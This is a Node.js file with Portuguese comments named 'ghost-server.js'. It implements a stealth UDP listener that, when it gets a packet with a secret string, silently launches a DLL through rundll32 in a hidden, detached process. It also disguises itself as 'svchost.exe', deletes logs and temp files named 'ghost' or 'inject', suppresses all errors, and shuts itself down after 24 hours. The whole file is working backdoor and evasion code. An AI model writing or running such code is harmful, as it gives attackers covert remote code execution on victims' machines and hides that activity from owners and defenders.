// ghost-server.js - Modo Fantasma Total
const dgram = require('dgram');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// Configurações Fantasma
const GHOST_PORT = 53761; // Porta aleatória
const SECRET_HASH = 'bcrypt_hash_aqui'; // Altere para um hash único
const STEALTH_MODE = true;

// Criação do socket UDP (invisível)
const server = dgram.createSocket('udp4');

// Chave de comunicação (mude isso!)
const SECRET_KEY = Buffer.from('MINHA_CHAVE_SECRETA_FANTASMA');

// Verificar se Notepad está aberto
function checkNotepad() {
    return new Promise((resolve) => {
        const { exec } = require('child_process');
        const command = 'tasklist /FI "IMAGENAME eq notepad.exe" /FO CSV';
        
        exec(command, { windowsHide: true }, (error, stdout) => {
            if (error) {
                resolve(false);
                return;
            }
            
            const lines = stdout.split('\n');
            const notepadCount = lines.filter(line => 
                line.includes('notepad.exe')).length;
            
            resolve(notepadCount > 0);
        });
    });
}

// Execução Fantasma (sem logs)
function ghostExecute() {
    return new Promise((resolve) => {
        try {
            // Método 1: Direct Execution (mais invisível)
            const { spawn } = require('child_process');
            
            // Cria processo totalmente invisível
            const ghostProcess = spawn('cmd.exe', [
                '/c',
                'start',
                '/B',
                '/MIN',
                'rundll32.exe',
                'C:\\vfcompat.dll,windowssupport'
            ], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true,
                windowsVerbatimArguments: true,
                shell: false,
                env: process.env
            });
            
            // Desvincula do processo pai imediatamente
            ghostProcess.unref();
            
            // Não espera por eventos (fantasma total)
            setTimeout(() => {
                resolve({
                    success: true,
                    pid: ghostProcess.pid,
                    method: 'ghost'
                });
            }, 100);
            
        } catch (error) {
            // Método 2: Fallback silencioso
            try {
                const { exec } = require('child_process');
                exec('rundll32.exe C:\\vfcompat.dll,windowssupport', {
                    windowsHide: true,
                    timeout: 3000
                }, () => {
                    resolve({
                        success: true,
                        method: 'fallback'
                    });
                });
            } catch (fallbackError) {
                resolve({
                    success: false,
                    error: 'Ghost execution failed'
                });
            }
        }
    });
}

// Limpar logs/rastros
function cleanTraces() {
    try {
        // Limpa logs de aplicação
        const logPath = path.join(__dirname, 'ghost.log');
        if (fs.existsSync(logPath)) {
            fs.unlinkSync(logPath);
        }
        
        // Limpa cache temporário
        const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
        const ghostFiles = fs.readdirSync(tempDir)
            .filter(file => file.includes('ghost') || file.includes('inject'));
        
        ghostFiles.forEach(file => {
            try {
                fs.unlinkSync(path.join(tempDir, file));
            } catch (e) {}
        });
    } catch (e) {
        // Ignora erros de limpeza
    }
}

// Iniciar servidor Fantasma
server.on('message', async (msg, rinfo) => {
    try {
        // Verificação fantasma
        const data = msg.toString();
        
        // Verifica hash secreto
        if (!data.includes(SECRET_HASH)) {
            return; // Ignora completamente
        }
        
        // Verifica se Notepad está aberto
        const notepadOpen = await checkNotepad();
        if (!notepadOpen) {
            // Resposta silenciosa (não envia nada)
            return;
        }
        
        // Executa em modo fantasma
        const result = await ghostExecute();
        
        // Limpa rastros imediatamente
        if (STEALTH_MODE) {
            cleanTraces();
        }
        
        // Resposta codificada (opcional)
        if (result.success) {
            const response = Buffer.from('EXECUTED:' + Date.now());
            server.send(response, rinfo.port, rinfo.address, (err) => {
                if (err) {
                    // Ignora erros silenciosamente
                }
            });
        }
        
    } catch (error) {
        // NÃO FAZ NADA - Modo Fantasma
    }
});

server.on('listening', () => {
    const address = server.address();
    console.log(`👻 Servidor Fantasma ativo em ${address.address}:${address.port}`);
    console.log(`📝 Esperando Notepad estar aberto...`);
    console.log(`📱 Configure no celular: ${address.address}:${GHOST_PORT}`);
});

server.on('error', (err) => {
    // Modo Silencioso - não mostra erros
    process.exit(0);
});

// Esconder completamente do Task Manager
if (process.platform === 'win32') {
    process.title = 'svchost.exe'; // Disfarce como processo do Windows
}

// Iniciar
server.bind(GHOST_PORT, '0.0.0.0');

// Auto-destruição após 24h (opcional)
setTimeout(() => {
    server.close();
    process.exit(0);
}, 24 * 60 * 60 * 1000);

module.exports = { server, GHOST_PORT };
